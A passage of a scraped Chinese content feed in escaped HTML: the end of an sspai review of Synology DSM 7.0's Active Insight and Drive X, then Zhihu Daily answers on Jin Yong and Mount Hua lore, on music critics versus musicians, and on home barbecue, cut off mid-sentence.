src=\"https://cdn.sspai.com/2021/08/05/fb20a6850401913cbbe4d0e249791516.png\"></figure><p>对于最重要的机械硬盘，你可以看到的是利用率、读取/写入的 IOPS、读取/写入延迟，读取/写入的通量数据等等，当然最重要的还有硬盘的温度。当你将鼠标放入到图表中是，还可以看到横向时间轴对应的硬盘当时的温度数据，可以说对于运维人员而言，设备的健康状况可谓是一目了然。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/11928eb8db33d4d541f878d4e5402846.png\"></figure><p>而对于网络和数据服务上，通过「服务」选项卡可以看到设备中 NFS 和 LUN 的运行情况，当然由于我的设备并未运行，这里呈现都是空数据。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/de38479043bffd42e7187c63dbbe7da4.png\"></figure><p>在「服务信息」选项卡中，你可以看到当前 NAS 上运行了哪些服务以及哪些套件；「存储空间」选项卡中，你可以看到一个目前的硬盘使用量以及基于时间端的空间使用趋势，同时还可以看到存储池的分配情况，比如说做的何种形式的 Raid，几个存储空间以及硬盘型号等信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/e4952f1816fa379e6c05ff026b6a2457.png\"></figure><p>在左侧的导航中的「事件」模块，你可以看到和群晖故障相关的事件，如果遇到严重事件会提示并要求你尽快处理，但由于我的群晖运行良好，并没有记录下任何需要处理的事件信息，而在「管理」模块中，我们可以看到登录过该服务的客户端以及位置、目前的主机群组以及启用 Active Insight 服务的主机信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/a3711960b73754a047cb95964f968691.png\"></figure><p>在自定义事件中，则可以定义什么样的主机事件是需要处理的，默认的事件是主机和 Active Insight 失去链接一个小时后会发出警告，12小时会发出严重的警告。当然我们也可以对这一条默认的事件进行编辑，也可以通过「新增」来自定义警告事件，具体来说你可以调整指标信息，设立事件以及条件，并设置警告的阀值，并撰写相关的建议解决方案等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/2418b165fcd73584f39f3a69e9ff92fe.png\"></figure><p>导航栏最后一个模块是「订阅」模块，事实上 Active Insight 未来很有可能会变成一项增值订阅服务，由于目前处于测试计划中，因此可以免费享受所有高级功能，这包括每分钟更新一次数据指标、数据历史记录在线上保留一年的记录以及自定义的警报事件等等，对于服务器运维人员，这项在线的监控功能提供了极高的数据信息粒度，当然也比其他第三方的监控服务在数据可视化呈现上要更具有针对性。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/010ed006556bf1cd39e9c8f8f00fbb8d.png\"></figure><h3><strong>Drive X：下一代的 群晖 Drive 客户端</strong></h3>\n<p>在经过几个月的内测之后，这个号称是下一代群晖 Drive 手机客户端 Drive X 也伴随着 DSM 7.0 的正式版上线同步开放下载。此前的群晖 Drive 的手机客户端单就功能上说更像是一个单纯的网盘的文件资源管理器，而 Drive X 则要更为丰富，除了文件管理器之外还内置的查看工具，甚至还有一些针对国内市场的创新小功能。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/a1e4e8f7a9786b51966f6041ab67c326.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/113fa46fbd39108e72a7bd6c90b387bd.png\" alt=\"\"></figure><p> </p>\n<p>所以相比此前的 Drive 客户端，Drive X 也加入了首页这个新的 Tab 页面，上半部分是细分的各种文件类别，对于需要访问特定某个类型的文件可以通过这样的方式实现快速访问，而下方呈现的则是近期使用的文件列表，你可以直接通过右下角的添加按钮来实现上传文件、创建文件夹、上传图片/录像/拍照上传等一系列的操作。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/8726591b3a138179fbb3f08093137663.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/ee0271b23c59a1a42abfd7ce90857f2a.png\" alt=\"\"></figure><p> </p>\n<p>而这种基于「文件类型」的文件资源管理器就非常适合快速筛选文件，比如说我最近编辑了哪些文档类的文件，就可以通过「降序排序」并且以「修改时间」作为排序依据，这样近期我编辑的文件就这样整理出来了。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/74d540a81e8ac4b55b2a18b76d709cb0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/0dddd27d96e4f289765b6f2de1798f0e.png\" alt=\"\"></figure><p> </p>\n<p>Drive X 另一项比较方便的功能则是对于部分文件类型可以无需第三方 App 打开，而是直接通过内置的查看器来打开，比如针对音乐类型的文件可以直接通过Drive X 内置的音乐播放器打开，甚至还可以直接创建音乐歌曲的播放列表。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/a1916ccc1142c86cfad23e1937bd0773.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/f6518c27d95b7415c42b246c5929aeb2.png\" alt=\"\"></figure><p> </p>\n<p>而除了作为一个私有云的网盘客户端之外，Drive X 还针对国内的市场 环境推出了两项非常实用的备份服务：照片备份和微信备份。其中照片备份可以读取你拍摄并保存到手机本地相册中照片，并将其自动上传到你的群晖 Drive 中。而微信备份则是将你手机微信保存的文件自动上传到 Drive 中，注意它并不能自动保存你的微信聊天记录信息。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/6cd1d2bcae1403d76457b946829cf492.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/05/c823fd736290ae06c187df136d0be2ea.png\" alt=\"\"></figure><p> </p>\n<p>当然，照片备份这一项，如果你已经使用了 Synology Photo 并开启了自动备份手机本地相册照片，那么大可不必开启（功能上其实已经重复）。而微信接收文件自动上传云端倒是非常实用，这样接收桌面端没有接受文件，也可以在自己的私有云中找到备份。</p>\n<p>总的来说，Drive X 比起之前的手机端的 Drive 客户端要更为实用，目前唯一的缺点可能就是目前仅支持 Android 手机。</p>\n<h2><strong>总结</strong></h2>\n<p>在实机完成 DSM 6.X 到 DSM 7.0 升级之后，我也终于完成了这个新一代的 DSM 7.0 系统的完整体验。对比此前在虚拟机上的使用体验，在实机的体验也更为完整真实。虽然大量的组件以及功能在新的系统中被放弃或者结束支持，但出现了一批更适合当前使用场景的新功能。虽然是这支持一款基于 NAS 硬件的系统，但深入体验后会发现改变的可能不仅仅只是 NAS 本身，还有他周围链接的一大圈生态系统，而或许今天这一篇补遗能让你更深刻的体会到这个新 NAS 带来的变化——更安全、更便捷的保存和使用你的个人数据。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68113"},{"title":"金庸为什么偏爱华山？","date":"2021-08-07 23:07:15","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-a3fcb19e607897d46b67eff47383eb00_l.jpg?source=8673f162\"><span>远方有方，</span><span>远行万里路，路读万卷书</span>\n<a href=\"https://www.zhihu.com/question/477077735/answer/2037312291\" hidden>阅读原文</a>\n</div>\n<div>\n<p>武侠宗师金庸先生虽然在封笔 30 多年后的 2003 年才首次登顶华山，但他 15 部大作中至少有 6 部都涉及令他魂牵梦绕的华山。</p>\n<p>背景设定在南宋时期的《射雕英雄传》和《神雕侠侣》都提到了东邪黄药师、西毒欧阳锋、南帝段智兴、北丐洪七公、中神通王重阳这“天下五绝”为争夺《九阴真经》，在华山顶峰大战七天七夜的故事，即金庸先生在华山北峰挥毫写下的武侠世界巅峰对决“华山论剑”。</p>\n<p>后来，在《神雕侠侣》的南宋之后、《倚天屠龙记》的明初之前，大概 100 年时间里，不知何人在华山创业（可能是王重阳的弟子郝大通），并逐步发展为江湖六大门派之一的“华山派”，后来还参与了围攻明教光明顶的“义举”。</p>\n<p>到了大约明朝中期的《笑傲江湖》，华山派已盛极一时，虽然掌门岳不群人品不太行，但敢于修炼葵花宝典，勇气可嘉。</p>\n<p>他徒弟令狐冲更是已成为男一号，推测还可能帮助华山剑宗长老风清扬重振了华山派。</p>\n<p>再到明朝末年的《碧血剑》，华山派已是武林第一门派，掌门穆人清及其弟子袁承志带领华山派走向了巅峰时代。</p>\n<p>直到金庸先生封笔之作《鹿鼎记》所处的清朝康熙年间，袁崇焕后人估计遭到政府镇压，华山派开始日薄西山，当穆人清的二弟子神拳无敌归辛树夫妇刺杀康熙力战而死后，华山派也彻底销声匿迹。</p>\n<p>金庸先生如此偏爱华山，为一个虚构的华山派都安排了如此连贯的逻辑线，或许是因为华山真的充满侠气吧。</p>\n<p><strong>侠义华山的前世今生</strong></p>\n<p>中国最古老的奇书《山海经》最先提到华山，《水经》说华山得名是因为五峰“若花状”，班固编纂的《白虎通义》认为“万物生华，故曰华山”。</p>\n<p>《尔雅》记载周平王姬宜臼东迁洛邑，因华山在王都之西，故称“西岳”，《尚书》更言之凿凿，记录华山是“轩辕黄帝会群仙之所”（可能是与各部落酋长会盟），《史记》说虞舜曾到华山巡狩，《资治通鉴》也讲“唐尧四巡西岳”。</p>\n<p>后来秦始皇嬴政、汉武帝刘彻、汉元帝刘骜（王政君的儿子、王莽的表哥、才女班婕妤和美女赵飞燕的老公）都曾到华山脚下祭祀。</p>\n<p>那时上山无路，各种祭祀大典基本都在山下的西岳庙举行。</p>\n<p>因在五岳庙宇中建置最早（汉武帝时期）、面积最大，西岳庙被称为“五岳第一庙”，直至今天仍是西北地区现存最大的明清风格皇家宫殿御苑式古建园林群落，又因规模布局形似北京故宫博物院，老百姓也称其为“陕西故宫”。</p>\n<p>到了李唐时期，尊崇老子的道教走向兴盛，李渊、李世民、李治、李隆基四代帝王先后以各种形式祭山朝拜，引得各地的虔诚道徒们争相来此居山建观，并逐渐在北坡沿溪谷而上开凿了一条险道，形成“自古华山一条路”。</p>\n<p><strong>五代时期，华山云台观（位于华阴市华山峪北约一公里处，早已损毁，仅留有“一柏一石一面井”）就隐居着一位仙风侠骨的大神级道士，即继老子、张道陵之后的第三位道教大宗师陈抟</strong>。</p>\n<p>这位据信活了 118 岁的太极文化之祖不仅发明了太极图、写成了《无极图》、注释了“河图洛书”，据说还和皇帝做了一笔生意，用万里江山换了千里华山。</p>\n<p>陈抟 80 多岁时已红遍天下，被世人称为“陆地神仙”。</p>\n<p>连年征战、手头略紧的周世宗郭荣慕名请教“黄白之术”，他翻翻白眼毫不客气回怼“点石成金是旁门左道，勤政爱民才是治国正路”，随后仰天大笑出门去，潇潇洒洒回了华山。</p>\n<p>不久，一个身怀绝技的年轻小伙来到华山找人“论剑”，打了几路自己发明创造的“太祖长拳”（当时还叫“三十二式长拳”，后来也叫“洪拳”，明朝名将戚继光的《纪效新书》将太祖长拳排在天下武功第一位），没见有人站出来比试，肚子却饿得提意见，只好四处找吃的。</p>\n<p>好在天无绝人之路，一处静谧的道观中几棵桃树上正结着硕大的鲜桃，令人垂涎三尺，小伙见左右无人，飞身跃起撸了半筐。</p>\n<p>正吃得风卷残云之际，几声轻咳从背后响起，一个须发花白、步履蹒跚的老道士笑眯眯地走了出来。</p>\n<p>小伙满脸臊红，翻遍全身找银子，可惜兜比脸还干净，只好拿捏出一个尴尬又不失礼貌的微笑，硬着头皮等着臭骂。</p>\n<p>没想到老道士挺和蔼，“没钱咱就比试一下吧！”</p>\n<p>小伙上下反复扫描他半天，略带鄙视加警惕的眼神还是压抑不住流露了出来，“你这老胳膊老腿的，不是碰瓷的吧！”</p>\n<p>老道士看破却没说破，“想的美！我才不跟你打架！比比下棋就行了！”</p>\n<p>第一代太祖长拳和第一代太极拳就这样完美错过了切磋机会。</p>\n<p>下棋嘛，姜当然是老的辣，小伙连输三局，无奈求饶“吃霸王餐是我不对，我留下来连洗三个月盘子，你看中不中？”</p>\n<p>老道士眯着眼睛，图穷匕见“不用这么麻烦，你只要立个字据，承认华山归我就行！”</p>\n<p>小伙抓耳挠腮琢磨半天也没发现这里面有什么逻辑陷阱，我还承认月亮是你的呢，我说了算吗我！支支吾吾试探着问道“就……这么简单？”</p>\n<p>老道士哈哈大笑“就这么简单！”</p>\n<p>于是双方愉快签约，各得其所，分道扬镳。</p>\n<p>如今的华山东峰西侧，穿越天下奇险“鹞子翻身”，在一座四周孤峭、窄仅盈丈的小山峰上，迎风矗立着一个不大的小亭子，即当年他们俩对弈的“下棋亭”，亭内石桌上还留着半盘残局，当年的合同已成“文约石”，连看热闹的猴子也石化为“猴子观文约”。</p>\n<p>小伙当时万万没想到，没过几年，他就在陈桥驿被他的小伙伴们“黄袍加了身”，从那天开始，华山究竟归谁，还真是由他说了算。</p>\n<p>老道士听说后高兴得眉飞色舞，被《水浒传》开篇抓拍了个正着“那时西岳华山有个陈抟处士，是个道高有德之人，能辨风云气色。一日，骑驴下山，向那华阴道中正行之间，听得路上客人传说：如今东京柴世宗让位与赵检点登基。那陈抟先生听得，心中欢喜，以手加额，在驴背上大笑，颠下驴来。人问其故。那先生道：天下从此定矣！正乃上合天心，下合地理，中合人和。”</p>\n<p>赵匡胤身为习武之人，自然得大气守信，痛快地依约将华山赐给陈抟，从此西岳附近的老百姓下巴便翘了起来“自古华山不纳粮，皇帝老子管不着”。</p>\n<p>再后来，赵匡胤在斧声烛影中蹊跷死去，他弟弟赵光义听妈妈的话、依“金匮之盟”接班掌权。</p>\n<p>可能由于底气不足，就邀请陆地神仙陈抟出面“澄清”背书。</p>\n<p>或许是碍于情面，也可能是胳膊拧不过大腿，陈老仙只好出庭作证“莫道世间无真主，一胎生下二龙来” （《说岳全传》的桥段），算坐实了太宗真龙天子的身份，美得他赶紧投桃报李，赐封陈抟“希夷先生” （今天的华山仍有一处希夷峡）。</p>\n<p>不过从老子的《道德经》“视之不见名曰夷，听之不闻名曰希”来看，赵光义这是啥意思？让老神仙装聋作哑吗？</p>\n<p>陈抟 118 岁时坐化在毛女峰东北的张超谷，常听他讲经的五色巨龙也沉入华山门北五龙桥下的五龙潭。</p>\n<p>后来宋仁宗兴建玉泉院以示纪念，南宋大诗人陆游也留诗凭吊“莲花峰下张超谷，此老何曾有死生。闻道风清明月夜，至今鼻息乱松声”。</p>\n<p>如今，在河南鹿邑县紫气大道南侧有一个 300 多亩的陈抟公园，安徽亳州南郊的陈庄也有个陈抟纪念馆，义正言辞地争抢这位都说出自本地的著名仙侠。</p>\n<p>朱元璋 70 岁那一年，也就是去世的前一年，收到一幅太华全图，图中白云缭绕、松枝掩映，峰若神剑、直插青冥，满纸烟云、跃然眼前，他连连感叹“古人谓华岳乃西京王气之系，今以此图观之，诚不谬也！”</p>\n<p>不知不觉间老皇帝陷入了一种半睡半醒的朦胧状态，仿佛站上了华山之巅，俯视自己 70 年波澜起伏的人生影像，父母饿死、幼入空门、沿街乞讨、南征北战、尔虞我诈、血雨腥风……实在太累了，真想歇歇了，恍惚间又似已置身华山千谷万壑之中，与灵鸟仙鹤为伴，与岳神白帝神交，那个远方的世界竟然比自己拼了老命、试图完美架构的现实世界更加美好，实在令他神往。</p>\n<p>朱元璋醒来后连忙详细记下梦中奇遇，一气呵成《梦游西岳庙文》（西岳庙万寿阁原本有一块石碑录了全文，后移至游岳坊，现已不知所踪），不久驾鹤西去，魂归梦境。</p>\n<p>布衣皇帝的临终感慨“于戏！朝乃作思，夜必多梦。吾梦华山，乐游神境，岂不异哉！”已成绝唱。</p>\n<p>因华山位于中国版图的最中央，又称中华山，孙中山先生于此取义，创建了“中华民国”。</p>\n<p>《河岳沧桑》第二卷【华山侠影】第 1 章：侠义华山的前世今生</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/477077735\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738982"},{"title":"那些乐评人乐理知识那么好，不管什么样的作品都能挑出毛病来，为什么他们却写不出好作品来?","date":"2021-08-07 23:07:08","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/7d440fddb265c5e3339114ea08ab7ada_l.jpg?source=8673f162\"><span>Molho，</span><span>lbg小粉丝/音乐制作/音频软硬件/交互装置艺术</span>\n<a href=\"https://www.zhihu.com/question/436183541/answer/1691812407\" hidden>阅读原文</a>\n</div>\n<div>\n<p>其实这个问题的答案很简单，一是因为世界上不存在完美的艺术作品，二是无论对于乐评人还是职业音乐人，写出好作品本身就是非常难的一件事。</p>\n<p><strong>一、世界上不存在完美的艺术作品</strong></p>\n<p>Tumblr 和 reddit 上就有这样的兴趣小组，这些兴趣小组最热衷事，就是从各个大作曲家的作品里发现瑕疵，比如平行五度（parallel fifth）。如果你有兴趣去看看，你会发现哪怕是像巴赫、莫扎特、贝多芬这样的大作曲家，他们也偶尔会犯“低级错误”（是真的平五，并不是声部加厚）。</p>\n<p>而且众所周知，古典音乐已经是属于评价维度非常狭窄的风格了，因为音乐自身的结构和逻辑对于音乐的意义和影响，要远远大于作曲家的生平，时代和文化背景。举个例子，拿巴赫的《赋格的艺术》来说，如果你要给这部作品写乐评，那你起码是得稍微懂一点点的对位法的。虽然也有很多的文献是从文化和宗教的角度去分析这部作品的，但是无论切入的角度再如何偏离音乐分析，基本的对于音列、动机和发展的讨论都是无法绕过去的。</p>\n<p>而随着音乐这门学科的不断发展，音乐的维度也在不断扩展，相应的音乐评价的维度也随之丰富。举个例子，当你评价一首古典音乐（而不是其录音）时，一般只能从谱面写作，文化背景，时代、个人经历等寥寥几个维度进行评价。而当你评价一首当下的流行音乐时，仅从音乐性角度，你就能从旋律、作词、演唱、编配、声音录制、合成器音色调制、混音等数个维度进行评价，更不用说是歌曲的风格流派、文化、思潮、历史沿革等更加多维的文化性角度了。</p>\n<p>然而，即便是在评价维度非常狭窄的古典音乐领域，这个领域的天花板们比如贝多芬等等，尚且不可能做出完美的作品。而今天面对这么多的评价维度，要做出各个维度上都完美的作品，就更加困难了。这就自然而然地导致了题主所提到的第一个问题，即“不管什么样的作品都能挑出毛病来”。最经典的例子，莫过于我们这个星球上最腕儿的影视作曲家 Hans Zimmer，前段时间在知乎上给人 diss 了。</p>\n<p><a href=\"https://www.zhihu.com/question/431097835\">为什么汉斯季默的写作这么差，还能变成电影配乐大师？</a></p>\n<p>同样的，除了电影配乐一哥 Hans Zimmer，当评价龚琳娜老师的《忐忑》时，我也可以避开这首歌的艺术性和高超的演唱技巧性，单单从“歌词的信息量接近 0”的角度去批评其歌词写的不行；当评价披头士时，我也可以完全避开文化和时代背景，就单单拿他们的乐器演奏水平去和当代的大师比较，然后得出他们演奏和编曲不行的结论；当评价 Art Tatum 时，我也可以避开他高超的演奏水平不谈，然后从录音的角度去论述他录音质量稀烂；而且哪怕是天才少年 Jacob Collier，YouTube 上也照样有人做视频黑他。</p>\n<p>总之，只要你想批评，任何的艺术作品，你都能找到无数的瑕疵。</p>\n<p>同样的，只要你想褒奖，任何的艺术作品，你也能找到无数的可以吹捧的角度。这里就不展开了。</p>\n<p><strong>二、写出好作品本身就是非常难的一件事</strong></p>\n<p>从我第一次写作钢琴小品到现在，已经有 18 年了，而我做职业音乐人，也已经快 5 年了，期间我也认识了很多音乐领域的大咖，有一点是大家公认的，那就是写出一个让自己满意（而不仅仅是让甲方满意）的作品，真的是非常难的一件事。而且就算这个作品让你暂时满意了，可能过上一两年回来看，又会觉得哪儿哪儿都是问题。所以我是真的非常理解“好的作品永远是下一首”这种心态。</p>\n<p>其次，音乐人和乐评人所需要的技能树，虽然有交集，但还是不一样的。简单来说，音乐人的主要技能都是围绕着“如何更好地创作”来进行构建的；而乐评人的技能则是围绕着“如何更好地分析作品和传播观点”而构建的。这两种技能树没有孰优孰劣，而且都是音乐这个领域里必须且重要的技能。当然这两者肯定有交集，比如乐评人为了“更好地分析作品和传播”，可能会去了解一些与创作相关的知识，而音乐人为了“更好地创作”，有时候也会去了解有关于某一种音乐的文化和历史等等。这两种技能树是相辅相成的，所以确实是有优秀的乐评人（音乐人）同时也是优秀的音乐人（乐评人）的情况存在的，比如勃拉姆斯，德彪西等等。而近一些的，也有 YouTube 的网红乐评人（音乐人），比如 Adam Neely、Rick Beato 以及 David Bruce。</p>\n<p>当然，更多的情况是，人的精力是有限的，大多数人只能够在两种技能树之间选择一种进行深入学习，而且正如前文所说，音乐评价的维度是丰富的，乐评人不一定需要学习乐理，不需要进行音乐分析，他只要在众多的可以评价的维度里面，有一两个非常擅长的维度就可以了，比如歌词文学性，比如对风格的划分，比如对文化和历史的研究等等。所以，为了“更好地创作”而进行学习的音乐人，写出好作品的概率自然也会比乐评人高一些。</p>\n<p>并且长期的学习也会导致两者的思维模式产生分歧。举个例子，我为了能够更好地写作摇滚风格，曾在 Coursera 上学过罗彻斯特大学的 History of Rock。然而当我真正听到一首摇滚的时候，我第一反应还是去分析它的和声、Riff、编配、吉他的失真度、鼓和贝斯的混音等等，其次才会想要去了解它所表达的思想和其背后的文化等等。然而专业的乐评人的思考和分析模式，应该是反过来的。而且因为我仅仅了解的是摇滚音乐史，而对于这一时期的世界史，以及经济文化政治甚至是哲学思潮等都没有太深的了解，所以如果你要我去从这些维度写乐评，那我应该也是写不了的。</p>\n<p>总之，技能树的不同，导致了乐评人和音乐人的创作和评价能力的不同，乐评人不一定能写好作品，音乐人也未必能写好乐评。但是这并不妨碍有些两种技能书都点满了的乐评人（音乐人），能够同时也是优秀的音乐人（乐评人）。</p>\n<p><strong>三、私货（一）——音乐人和乐评人的区别</strong></p>\n<p>到这里呢，答主的问题就讲完了。然而除了知乎，微博上，油管上，Facebook 上，凡是有社交媒体的地方，乐评人和音乐人之争似乎就从没停止过。所以稍微输出一点自己的私货。</p>\n<p>我身边有几类朋友，如果按二维坐标系分划分的话，大致可以分为五类，最左边的一类是全职音乐人；第二类是本职是音乐人，业余做乐评人的；第三类是既是音乐人又是乐评人的；第四类是本职乐评人，业余音乐人；最右边的第五类是全职乐评人。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fdd8f89a982f8e4421a82776fb165666_720w.jpg?source=8673f162\" alt=\"\"></figure><p>单从数量上来看，第三类（既是乐评人又是音乐人）的是最少的，或许是因为精力有限，大家或多或少还是会有所侧重的。另外可能是因为圈子的原因，我所认识的第一类的数量是最多的。而第五类次之，第二类和第四类数量就更少了。</p>\n<p>另外我从平时的交流中发现，这个坐标轴两端的人，对待音乐和乐评的方式，还是有很大的区别的。具体来说，越靠近坐标轴左端，关于音乐的交流就越具体和客观，而相应的切入点也就越狭窄；而越靠近坐标轴右端，关于音乐的交流就更加发散和主观，切入点也会比较开放。</p>\n<p>举个例子，比如《切尔诺贝利》的原声集，我就和 A（音乐人），B（乐评人）和 C（本职音乐人，业余乐评人）都交流过。A 更喜欢从声音设计和具象音乐的角度来分析音乐，我和他交流的点主要在于白噪声要如何进行调制，空间感是如何形成的，以及在制作的时候，要如何获得类似的音色。而和 C 讨论时，则不会这么具体到音色和写作，而是提供了一些心理声学方面的视角，比如音高的上行和下行，以及它的 Drones 是如何微妙地影响人的情绪的。而 B 则给了一个和前两者完全不同的视角，他主要是从《切尔诺贝利》的作曲家 Hildur Guðnadóttir 的生平，以及近两年 BAFTA 和奥斯卡在 Best Original Score 评选上的“政治正确”的角度来讲的，包括之前两次提名的最佳配乐的 Mica Levi，以及坂本龙一的《荒野猎人》，实际上也都是受类似风格的影响等等。</p>\n<p><strong>总之，和坐标轴左端的人交流时，你就像是进入了音乐的微观世界</strong>，在这个地方，文化、情绪、历史、主流审美的话语权等等，都不再重要。音乐只是声音本身，我们讨论的是声音的密度，声音的色彩，声音的组织方式。任何风格任何流派，都被庖丁解牛般拆成了最小的认知单元进行讨论。<strong>而和接近坐标轴中端的人交流时，你能够感受到音乐和世界的连接。</strong>音乐可以是没有情绪的，也可以是有情绪的，而在这个地方，乐评才开始接近普通人的感知。如果只是纯粹理性去看待音乐，有时候也是没有办法准确体会到它带给人的情绪的。而处于中间的这些乐评人，实际上是能帮助音乐人更感性地审视自己的作品的。<strong>而和坐标轴右端的人交流时，你能够知道这个音乐在宏观的整个人类的文化里，应该是在一个什么样的位置。</strong>这个位置不仅仅是作品的地位，也是风格和时代的位置。处在这个位置的乐评人，应该给你展现一个更广阔的世界，让你对整个音乐文化，文化背后的历史，形成一个全面的认知。</p>\n<p>所以，乐评人是有其存在的必要的，对于普通听众来说，要想看清楚音乐的全貌，音乐人和乐评人两者都是不可或缺的。</p>\n<p><strong>四、私货（二）——什么是好乐评</strong></p>\n<p>说了这么多，什么样的乐评才是好的乐评呢？我觉得＠邓柯老师</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//weibo.com/dkinbj%3Ftopnav%3D1%26wvr%3D6%26topsug%3D1\" target=\"_blank\" rel=\"nofollow noreferrer\">Sina Visitor System</a></p>\n<p>和＠栾老师的乐评就非常好。</p>\n<p><a href=\"https://www.zhihu.com/column/c_1191018625732288512\">新音乐手册</a></p>\n<p>好的乐评我觉得应该具有以下几个素质：</p>\n<p><strong>（一）有客观描述。</strong></p>\n<p>好的乐评不一定需要涉及乐理，因为乐评不是音乐分析。乐评可以是任意维度的，但是无论选择什么维度进行评价，情绪也好，历史也好，文化也好，风格流派也好，一定要有客观的描述。因为每个人看待音乐的视角和观点都是不一样的，而只有客观的东西，才是所有人都能接受和认可的“共性”，才能作为你接下来输出主观的基石。乐评不一定需要做到全部客观，因为太客观看起来会少很多乐趣，但是不能完全主观，完全主观的不叫“乐评”，只能叫“随感”。</p>\n<p><strong>（二）可以输出主观，包括审美输出，但一定要有论据作为支撑。</strong></p>\n<p>既然是“评”，那当然可以包含有主观评价，褒奖也好批评也好，都可以。但是如果你要说一个作品好，那么好在哪里，不好，又不好在哪里。你都需要给出一定的依据，而不能只给出观点不给论据，否则就又变成没有意义的“随感”了。当然，你也可以输出你自己的审美观点，因为审美观点也是观点的一种。在“评”的时候，你既可以采用主流的评价体系，也可以有自己独立的评价体系，这都没有关系，毕竟音乐领域自创的各种研究和分析的方法海了去了，但是有个前提，就是这个体系得是自洽和稳定的。比如假唱就是不好，你不能Ａ假唱了进行抨击，而Ｂ假唱了却用各种理由洗白。</p>\n<p><strong>（三）好的乐评，应该能够引导读者进行自我思考。</strong></p>\n<p>如果能满足（一）和（二），那其实已经可以算是好乐评了。第三点是在此基础上进行拔高。可能比较反直觉的是，好的乐评，真正“评”所占的成分不应该多，好的乐评除了像议论文之外，应该更像一篇说明文，科普文甚至是音乐分析。除了直接给观点和论据，对读者进行填鸭式输出的之外，好的乐评应该多给例子，引导读者自己去进行思考，去引导他们构建一个自己的审美和评价体系，从而自己能够得出结论。这才是乐评的最高境界，也是德彪西和勋伯格作为乐评人的伟大之处。</p>\n<p><strong>（四）只输出主观、情绪、以及宗教式的“优越感”的乐评，一定是“坏”的乐评。而且是很坏的那种。</strong></p>\n<p>遗憾的是，大多数读者都只喜欢看带有情绪煽动和能够让自己秀优越的乐评。而这类乐评最大的特点，就是带有很强的主观性以及情绪。毕竟正儿八经看一篇音乐分析，哪有看一篇吐槽爽呢？最常见的几种类似的乐评方式，想必大家都见过。比如“某某做的是实验音乐，实验音乐就是牛Ｘ”，“听独立音乐，地下音乐的人品味都牛Ｘ”等等。更有甚者，曾经的乐评人变成音乐人之后，输出的乐评就变成了“我怎么怎么牛Ｘ，听我的曲子的人都是人上人”，或者是“虽然我写的可能还不行，但是我理念绝对是世界顶级”之类的。</p>\n<p>这类“低质乐评”，没有任何的干货或者是有启发性的观点。唯一的作用，就是引起读者的情绪，或是让读者产生虚妄的“品味优越感”，并且让读者和听众丧失对音乐好坏的鉴别能力，进入一种宗教狂热式的盲目的吹捧或者贬低某些音乐作品的状态。</p>\n<p>然而通过标榜听歌的品味来彰显的“优越感”，是这个世界上最廉价的一种优越感。看这种低质的乐评，你的情绪被煽动起来了，话题流量被带起来了，钱也都给无良乐评人赚走了。一地鸡毛过去，你除了浪费了时间和情绪，你获得了什么呢？</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/436183541\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738963"},{"title":"为什么家庭烧烤烤不出香味，肉还很干？","date":"2021-08-07 23:07:02","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-953942f1d40ad9e54cf017790065f3f4_l.jpg?source=8673f162\"><span>老叁叁，</span><span>成绩不好 卖烧烤</span>\n<a href=\"https://www.zhihu.com/question/377930795/answer/1070437490\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我斗胆猜一猜，你的烤肉根本就是方法理解有误。</p>\n<p>1.你忽略了用“油”的重要性</p>\n<p>2.你是直火高温烤的</p>\n<p>3.选的肉是否适合烧烤</p>\n<p>肉不浸泡油，不刷油，不过油炸的话表面无法进行高效率的热传导，肉的表面和内部热传导依靠的是空气和肉里面自带的水分，传到过程中水分蒸发流失，自然干了，表面的植物油可以有效让肉表面快速达到封住内部水分的作用，表面还可以因此快速产生焦糖化和美拉德反应。烤任何蔬菜也是同一个道理。</p>\n<p>业余人士烤肉，即使用炭火，也很容易造成不必要的直火烤，（炭火明明就是需要把炭放在适合的位置，制造稳定的温度区域，并且避免肉下面是炭的）基本上就是明火在那慢慢烧，脂肪滴下去又又明火窜起来，很多人都没有理解需要的是持续稳定的温度，而不是高温就对了。一般温度也不宜过高，个人建议控制在 150-220 